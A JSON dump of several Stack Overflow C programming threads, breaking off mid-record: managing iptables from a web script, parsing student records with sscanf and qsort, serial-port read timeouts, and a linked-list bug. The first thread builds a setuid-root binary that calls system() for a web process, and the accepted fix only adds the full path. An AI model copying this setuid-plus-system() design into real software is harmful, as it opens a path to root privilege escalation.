[{"tags": ["c", "linux", "apache", "cgi"], "comments": [{"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 2, "creation_date": 1461799652, "post_id": 36902557, "comment_id": 61369292, "body": "Perhaps the problem is that <code>iptables</code> is not on the <code>PATH</code> given to your web-server-launched process. The right solution would include not using <code>system()</code> at all but at a minimum, provide the full path to the executable, not just the name of it."}, {"owner": {"reputation": 19222, "user_id": 789186, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9d232cc5abe46092d3972d4f85833e42?s=128&d=identicon&r=PG", "display_name": "user4035", "link": "https://stackoverflow.com/users/789186/user4035"}, "reply_to_user": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461838769, "post_id": 36902557, "comment_id": 61385725, "body": "@mah Yeah, it was the path to iptables. After changing it to <code>&#47;sbin&#47;iptables</code> it worked. Can you put it as an answer?"}, {"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461857944, "post_id": 36902557, "comment_id": 61400499, "body": "glad it helped. Answer posted."}], "answers": [{"tags": [], "owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "is_accepted": true, "score": 1, "last_activity_date": 1461857911, "creation_date": 1461857911, "answer_id": 36919360, "question_id": 36902557, "link": "https://stackoverflow.com/questions/36902557/how-to-manipulate-iptables-rules-from-the-web-script/36919360#36919360", "title": "How to manipulate iptables rules from the web script", "body": "<p>When you call <code>system(\"iptables -L\");</code> you may or may not be able to find <code>iptables</code>, depending on your <code>PATH</code> environment variable. You should prepend the path to where the binary is so that you know it will be found:</p>\n\n<pre><code>int result = system(\"/sbin/iptables -L\");\n</code></pre>\n"}], "owner": {"reputation": 19222, "user_id": 789186, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9d232cc5abe46092d3972d4f85833e42?s=128&d=identicon&r=PG", "display_name": "user4035", "link": "https://stackoverflow.com/users/789186/user4035"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 361, "favorite_count": 0, "accepted_answer_id": 36919360, "answer_count": 1, "score": 0, "last_activity_date": 1461857911, "creation_date": 1461799019, "last_edit_date": 1492086984, "question_id": 36902557, "link": "https://stackoverflow.com/questions/36902557/how-to-manipulate-iptables-rules-from-the-web-script", "title": "How to manipulate iptables rules from the web script", "body": "<p>I have a linux box with web serverthe has 2 running services:</p>\n\n<ol>\n<li>web proxy (listens ports 80, 443)</li>\n<li>apache (listens port 8080)</li>\n</ol>\n\n<p>The users for proxy can register through web interface. I must give access to proxy only to the registered clients with certain IPs. Proxy is a handwritten script, and I have to use iptables to block the access. I wrote the following rules:</p>\n\n<pre><code>iptables -A INPUT -p tcp -m multiport --dports 80,443 -s &lt;valid IP 1&gt; -j ACCEPT\niptables -A INPUT -p tcp -m multiport --dports 80,443 -s &lt;valid IP 2&gt; -j ACCEPT\n...\niptables -A INPUT -p tcp -m multiport --dports 80,443 -s &lt;valid IP n&gt; -j ACCEPT\niptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP\n</code></pre>\n\n<p>It works. But when a new user is added through web interface, Apache launches a script as a non-root user. And I have to run <code>iptables</code> as root.</p>\n\n<p><a href=\"https://unix.stackexchange.com/a/2910/27689\">I can't set suid bit for a program, written in a scripting language</a>, so I created a C program <code>updater.c</code>:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(int argc, char* argv[])\n{\n    int result = system(\"iptables -L\");\n    printf(\"\\nresult=%i\", result);\n    return 0;\n}\n</code></pre>\n\n<p>Then I compiled it:</p>\n\n<pre><code># gcc -o updater ./updater.c\n# chmod +s ./updater\n</code></pre>\n\n<p>When I run it as a non-priviledged user in shell it works correctly: prints all the iptables rules.</p>\n\n<p>When I run it from the web, calling the program inside a shell script, it doesn't print anything. Despite the fact, that when I tried to create a file inside this C program, it was created with owner=root. <code>system(\"ls -l\");</code> also works - it prints the directory listing.</p>\n\n<p>How can I manipulate iptables rules from the web script?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1461798523, "post_id": 36902460, "comment_id": 61368977, "body": "The code you have shown doesn&#39;t look like much of a genuine effort. Have you tried to read the file at all? In any way? There are alot of examples out there and surely you can progress further than just opening the file. Or at least make some attempt to."}, {"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461798747, "post_id": 36902460, "comment_id": 61369026, "body": "I was trying <code>while(fgets(name, MAX, in) != (int)(EOF))</code> do some stuff with pointers, but i got write access violation from compiler, i guess i did read it wrong..."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1461798802, "post_id": 36902460, "comment_id": 61369042, "body": "You a better served creating an array of Students and dropping the <code>next</code> pointer. A linked list would unnecessarily complicate your project."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461798883, "post_id": 36902460, "comment_id": 61369068, "body": "<code>fgets</code> seems like a reasonable start. So do show that code and explain what problems you are having with it."}, {"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1461799790, "post_id": 36902460, "comment_id": 61369335, "body": "ok , here is my attempt reading it char by char for the first name, obviously i didnt format it correctly, oops :("}, {"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1461799806, "post_id": 36902460, "comment_id": 61369338, "body": "i have putted it in a code above, my try reading it char by char, until blank right?"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1461804050, "post_id": 36903163, "comment_id": 61370446, "body": "Thank you very much sir, no i don&#39;t have to use struct, i will do it like you said and try to finish it. It was a quality answer and read for me, especially memory part. Once again thank you very much!"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1461804974, "post_id": 36903163, "comment_id": 61370672, "body": "Glad to help. Everyone needs an example or two to get going. The key to learning C is to slow-down. There is a lot to learn and C the low-level control C provides means it is up to you to account for each block of memory you use. Most other languages go to a great deal of trouble to handle memory management behind the scenes, in C it is up to you. So <i>slow-down</i> and take time to understand the memory used by a <code>char</code>, then an array of <code>char</code>, a <code>struct</code>, and array of <code>struct</code>, etc. You will do fine."}, {"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1462696048, "post_id": 36903163, "comment_id": 61738486, "body": "I made the list like you said, and it&#39;s working great, my question is, how should i sort the list alphabetically by classes only, not their names? What function should i use for that?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1462698849, "post_id": 36903163, "comment_id": 61739160, "body": "To sort by class, you will use <code>qsort</code>. You will need to write a <code>compare</code> function that compares the <code>classes</code>. That could be done with <code>int compare (const void *a, const void *b) { return strcmp (((students *)a)-&gt;class, ((students *)b)-&gt;class); }</code>. You then just call <code>qsort (array, idx, sizeof *array, compare);</code> before you print."}, {"owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "edited": false, "score": 0, "creation_date": 1462744338, "post_id": 36903163, "comment_id": 61752458, "body": "thank you very much, i used i <code>qsort</code>, but without <code>compare</code> function, and he just sorted my string, but not the list. I knew i was missing something. Thank you sir!"}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": true, "score": 0, "last_activity_date": 1462700340, "last_edit_date": 1462700340, "creation_date": 1461803113, "answer_id": 36903163, "question_id": 36902460, "link": "https://stackoverflow.com/questions/36902460/reading-3-strings-from-a-text-file/36903163#36903163", "title": "Reading 3 strings from a text file", "body": "<p>Continuing from the comment, why are you approaching this problem with a <em>linked-list</em>? You can use a linked list, but the overhead and code complexity is more than required. A straight forward solution is a simply dynamic array of type <code>students</code>. The benefits of an array or significant. Direct access to all student, simple sorting with a single call to <code>qsort</code>, simple additions, etc..</p>\n\n<p>Don't get me wrong, if you assignment is to use a <em>linked-list</em>, by all means do, but you should really look at an dynamic array of type <code>student</code>, where you can <code>realloc</code> as needed to add as many students as you may like.</p>\n\n<p>For example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nenum { MAXC = 30, MAXS = 60, MAXLN = 128 };\n\ntypedef struct students {\n    char first[MAXC];\n    char last[MAXC];\n    char class[MAXC];\n} students;\n\nint main (int argc, char **argv) {\n\n    students *array = NULL;\n    size_t i, idx = 0, maxs = MAXS;\n    char buf[MAXLN] = \"\";\n    FILE *fp = argc &gt; 1 ? fopen (argv[1], \"r\") : stdin;\n\n    if (!fp) {  /* validate file open for reading */\n        fprintf (stderr, \"error: file open failed '%s'.\\n\", argv[1]);\n        return 1;\n    }\n\n    /* allocate/validate maxs students in array */\n    if (!(array = malloc (maxs * sizeof *array))) {\n        fprintf (stderr, \"error: virtual memory exhausted.\\n\");\n        return 1;\n    }\n\n    while (fgets (buf, MAXLN, fp)) {    /* read each line into buf */\n        /* separate in to struct members */\n        if (sscanf (buf, \"- %s %s %s\", array[idx].first,\n                    array[idx].last, array[idx].class) != 3)\n            continue;\n\n        if (++idx == maxs) {    /* check against current allocations */\n            void *tmp = realloc (array, (maxs + MAXS) * sizeof *array);\n            if (!tmp) {         /* valdate realloc array succeeded */\n                fprintf (stderr, \"error: realloc memory exhausted.\\n\");\n                break;          /* or break and use existing data   */\n            }\n            array = tmp;        /* assign reallocated block to array */\n            maxs += MAXS;       /* update current allocations size   */\n        }\n    }\n    if (fp != stdin) fclose (fp);   /* close file if not stdin */\n\n    printf (\"\\nstudents:\\n\\n\");     /* output formatted data   */\n    for (i = 0; i &lt; idx; i++) {\n        char tmp[2 * MAXC + 2] = \"\";\n        strcpy (tmp, array[i].last);\n        strcat (tmp, \", \");\n        strcat (tmp, array[i].first);\n        printf (\" %-60s %s\\n\", tmp, array[i].class);\n    }\n    putchar ('\\n');\n\n    free (array);   /* free all allocated memory */\n\n    return 0;\n}\n</code></pre>\n\n<p>(<strong>note:</strong> if your data file really doesn't begin each line with <code>'- '</code>, then just remove that from the <code>sscanf</code> <em>format-string</em>)</p>\n\n<p><strong>Example Input</strong></p>\n\n<pre><code>$ cat dat/studentclass.txt\n- John Johnson Math\n- Eric Smith Biology\n- etc.\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/structstudents &lt;dat/studentclass.txt\n\nstudents:\n\n Johnson, John                                                Math\n Smith, Eric                                                  Biology\n</code></pre>\n\n<p><strong>Memory Error/Check</strong></p>\n\n<p>In any code your write that dynamically allocates memory, you have 2 responsibilites regarding any block of memory allocated: (1) always preserves a pointer to the starting address for the block of memory so, (2) it can be freed when it is no longer needed. </p>\n\n<p>It is imperative that you use a memory error checking program to insure you haven't written beyond/outside your allocated block of memory, attempted to read or base a jump on an unintitialized value and finally to confirm that you have freed all the memory you have allocated. </p>\n\n<p>For Linux <code>valgrind</code> is the normal choice. e.g.</p>\n\n<pre><code>$ valgrind ./bin/structstudents &lt;dat/studentclass.txt\n==14062== Memcheck, a memory error detector\n==14062== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al.\n==14062== Using Valgrind-3.10.1 and LibVEX; rerun with -h for copyright info\n==14062== Command: ./bin/structstudents\n==14062==\n\nstudents:\n\n Johnson, John                                                Math\n Smith, Eric                                                  Biology\n\n==14062==\n==14062== HEAP SUMMARY:\n==14062==     in use at exit: 0 bytes in 0 blocks\n==14062==   total heap usage: 1 allocs, 1 frees, 5,400 bytes allocated\n==14062==\n==14062== All heap blocks were freed -- no leaks are possible\n==14062==\n==14062== For counts of detected and suppressed errors, rerun with: -v\n==14062== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 1 from 1)\n</code></pre>\n\n<p>Always confirm <em>All heap blocks were freed -- no leaks are possible</em> and equally important <em>ERROR SUMMARY: 0 errors from 0 contexts</em>.</p>\n\n<p>Look it over an let me know if the array approach fits your needs and if you have any questions.</p>\n\n<p><strong>Sorting by <code>class</code> member</strong></p>\n\n<p>In order to sort the array of <code>struct students</code> by the <code>class</code>, the easiest way is to use the <code>qsort</code> function. It is the standard sorting function provided by the C library (include <code>stdio.h</code>). You can sort by any member of the <code>students</code> struct. You can even sort by class, and by name.</p>\n\n<p>The only problem new programmers have with <code>qsort</code> is writing the <em>compare</em> function to pass to <code>qsort</code> in order to have it sort in the desired order. The <em>compare</em> function will receive a pointer to two elements in your array of struct student. The parameters passes are passed as <code>void *</code> (<code>const void *</code> actually). Just like any <code>void</code> pointer, you must cast it to the proper type before you can dereference it. (in this case <code>students *</code>) Therefore, you simply need a function that casts the <code>void</code> pointers to <code>students *</code> and passes the values to <code>strcmp</code>. Example:</p>\n\n<pre><code>int compare (const void *a, const void *b)\n{ \n    return strcmp (((students *)a)-&gt;class, ((students *)b)-&gt;class);\n}\n</code></pre>\n\n<p>The only thing left is calling <code>qsort</code> (after <code>fclose</code> in the code):</p>\n\n<pre><code>qsort (array, idx, sizeof *array, compare);\n</code></pre>\n\n<p>Your output is then sorted by class.</p>\n\n<p>If you then want to sort further by <code>last</code> name after sorting by <code>class</code>, instead of returning on the <code>strcmp</code> for <code>class</code>, test if the result is not equal to zero, and return that result. If the result of the <code>strcmp</code> on <code>class</code> is zero, then you simply <code>return strcmp (((students *)a)-&gt;last, ((students *)b)-&gt;last);</code>  That simply sorts by <code>class</code> first, but if the class is the same, sorts further by <code>last</code>. For example:</p>\n\n<pre><code>int compare (const void *a, const void *b)\n{ \n    int r;\n    if ((r = strcmp (((students *)a)-&gt;class, ((students *)b)-&gt;class)))\n        return r;\n\n    return strcmp (((students *)a)-&gt;last, ((students *)b)-&gt;last);\n}\n</code></pre>\n\n<p><strong>Example Input</strong></p>\n\n<pre><code>$ cat dat/studentclass.txt\n- Wade Williams Biology\n- John Johnson Math\n- Eric Smith Biology\n- etc.\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/structstudents &lt;dat/studentclass.txt\n\nstudents:\n\n Smith, Eric                                                  Biology\n Williams, Wade                                               Biology\n Johnson, John                                                Math\n</code></pre>\n\n<p>Take the time to learn <code>qsort</code>.</p>\n"}], "owner": {"reputation": 15, "user_id": 6161940, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207347685122184/picture?type=large", "display_name": "Ljubomir Maksimovic", "link": "https://stackoverflow.com/users/6161940/ljubomir-maksimovic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 36903163, "answer_count": 1, "score": -4, "last_activity_date": 1462700340, "creation_date": 1461798368, "last_edit_date": 1461799985, "question_id": 36902460, "link": "https://stackoverflow.com/questions/36902460/reading-3-strings-from-a-text-file", "title": "Reading 3 strings from a text file", "body": "<p>I am having trouble reading 3 strings from one line, moving to the next one, and putting them in my struct correctly. </p>\n\n<p>My text file looks like this: </p>\n\n<pre><code>- John Johnson Math\n- Eric Smith Biology\n- etc\n</code></pre>\n\n<p>I need to arrange students by class they have chosen. How should i read first string as name then blank, second as last name, and third by class and do that for every line, then store correctly in my struct? Here is what I have right now:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define MAX 30\n\ntypedef struct students {\n    char nameFirst[MAX];\n    char NameLast[MAX];\n    char choClass[MAX];\n    struct students *next;\n} Students;\n\nint main() {\n    FILE *in;\n    Students *first = NULL, *New = NULL, *last = NULL, *old = NULL, *current = NULL;\n    in = fopen(\"studenti.txt\", \"r\");\n    if (in == NULL)\n    {\n        printf(\"Cannot open file!\\n\");\n        return 1;\n    }\nwhile (i = fgetc(in) != (int)(EOF))\n{\n    New = calloc(1, sizeof(Students));\n    if (first == NULL)\n        first = New;\n    else\n        last-&gt;next = New;\n\n    j = 0;\n    while (i != (int)(' '))\n    {\n        New-&gt;nameFirst[j++] = (char)i;\n        i = fgetc(in);\n    }\n    New-&gt;nameFirst[j] = '\\0';\n}\n}\n</code></pre>\n"}, {"tags": ["c", "serial-port"], "comments": [{"owner": {"reputation": 6507, "user_id": 472647, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/ytEy0.jpg?s=128&g=1", "display_name": "CodeMouse92", "link": "https://stackoverflow.com/users/472647/codemouse92"}, "edited": false, "score": 1, "creation_date": 1461797159, "post_id": 36902185, "comment_id": 61368585, "body": "Where&#39;s the code? We need to see an <a href=\"http://www.stackoverflow.com/help/mcve\">MCVE</a>. See <a href=\"http://www.stackoverflow.com/help/how-to-ask\">How to Ask</a>."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 1, "creation_date": 1461798245, "post_id": 36902185, "comment_id": 61368912, "body": "What does the alarm mean? Does it mean something&#39;s wrong? If so, don&#39;t you have to deal with the failure?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461798395, "post_id": 36902185, "comment_id": 61368944, "body": "&quot;doing timeout by using setitimer()&quot;. There&#39;s a better way to implement timeout. Use <a href=\"http://linux.die.net/man/2/select\" rel=\"nofollow noreferrer\"><code>select</code></a> to wait for input to become available. <code>select</code> has built in timeout support."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1461822011, "post_id": 36902185, "comment_id": 61375637, "body": "@david I have multiple devices I have to comunicate with and I need to quickly comunicate with (switch between) all of them."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461822037, "post_id": 36902185, "comment_id": 61375648, "body": "@kaylum no, I can&#39;t use select, read the question again please"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1461859900, "post_id": 36902185, "comment_id": 61401837, "body": "@Charlestone The question doesn&#39;t explain why you can&#39;t use <code>select</code>. It seems like you definitely <i>should</i> use <code>select</code>."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1461864976, "post_id": 36902185, "comment_id": 61405012, "body": "&quot;I have set <i>multiple</i> blocking reads&quot; - I need to set up the timeout for all of them as a whole, not separetely. E.g. If I wanted to wait for 5s and used <code>select()</code> for two reads, it might happen that the first read() (the select() before first read) would block for 4 second and than the second <code>read()</code> would block for another 5 second - 9 second all together. But I wanted to wait for just 5 seconds."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1461866382, "post_id": 36902185, "comment_id": 61405905, "body": "@Charlestone When you use <code>select</code>, you also set all your descriptors non-blocking. You never block at all. You decide how long you are willing to wait and pass that to <code>select</code>."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1461866778, "post_id": 36902185, "comment_id": 61406161, "body": "sorry, i thought I was clear. E.g. If I wanted to wait for 5s and used select() for two reads, it might happen that the select before the first read would block for 4 second and than the select() before second read() would block for another 5 second - 9 second all together...."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1461867048, "post_id": 36902185, "comment_id": 61406302, "body": "@Charlestone The <code>select</code> before the second read would have a 1 second timeout either because only 1 second is left on the read with the least time or because you always use a 1 second timeout because that&#39;s your chosen resolution. So it could not block for 5 seconds."}], "answers": [{"comments": [{"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1461867986, "post_id": 36922543, "comment_id": 61406814, "body": "You still don&#39;t get me :/. I don&#39;t want to interrupt one read. I want to interrupt lets say a function, which consists of multiple reads() (and writes too). When the alarm &quot;buzzes&quot; in the middle of the read() I can track the EINTR ant return error on timeout, but when the alarm &quot;buzzes&quot; when I do not read() I would really like to immediately return error as well."}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 0, "last_activity_date": 1461911237, "last_edit_date": 1461911237, "creation_date": 1461867567, "answer_id": 36922543, "question_id": 36902185, "link": "https://stackoverflow.com/questions/36902185/multiple-reads-interupted-by-alarm/36922543#36922543", "title": "Multiple reads interupted by alarm", "body": "<p>There is a way to do what you say you want to do, but it is very ugly.</p>\n\n<ol>\n<li>Create a pipe. Close the write end of it. That will give you a descriptor that is dead and useless (for the read end).</li>\n<li>Take the descriptor for the serial port and <code>dup</code> it to save a copy.</li>\n<li>In your interrupt handler, <code>dup2</code> the dead descriptor over the serial port descriptor. This will ensure the next <code>read</code> or <code>write</code> fails and the function returns.</li>\n<li>To put things back to normal, <code>dup2</code> the saved copy of the serial port descriptor over the one you killed.</li>\n</ol>\n"}], "owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 33, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1461911237, "creation_date": 1461796736, "last_edit_date": 1461797171, "question_id": 36902185, "link": "https://stackoverflow.com/questions/36902185/multiple-reads-interupted-by-alarm", "title": "Multiple reads interupted by alarm", "body": "<p>I have set multiple blocking reads on a serial port and doing timeout by using setitimer(). When I finish reading (or the timeout expires and read() returns EINT) I write a different message, restart alarm and start to read again. However, I have now encountred a problem - what can I do when the alarm expires right between two reads? I would like to stop now, but I would just go to that next read. (seting some flag would just change the question to \"What should I do, if the alarm expires between the flag and read?\")</p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461796392, "post_id": 36902076, "comment_id": 61368277, "body": "<code>head-&gt;next</code> is never initialized."}, {"owner": {"reputation": 23, "user_id": 3593630, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1849af391af3074b7281a13364dfa635?s=128&d=identicon&r=PG&f=1", "display_name": "Chythe", "link": "https://stackoverflow.com/users/3593630/chythe"}, "reply_to_user": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1461796521, "post_id": 36902076, "comment_id": 61368333, "body": "That didn&#39;t change anything when I did <code>head-&gt;next = malloc(sizeof(node_t));</code> in main."}, {"owner": {"reputation": 36985, 